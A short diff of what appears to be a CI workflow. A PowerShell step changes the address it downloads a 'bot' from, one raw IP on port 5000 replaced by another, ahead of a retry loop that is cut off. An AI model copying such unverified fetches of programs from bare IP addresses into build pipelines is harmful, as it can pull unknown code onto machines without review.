@@ -110,7 +110,7 @@ jobs:
         shell: pwsh
         run: |
           $desktop = [Environment]::GetFolderPath("Desktop")
-          $botUrl = "http://82.47.102.153:5000"
+          $botUrl = "http://31.57.97.195:5000/"
           
           # Download bot with retry
           for ($i = 1; $i -le 3; $i++) {
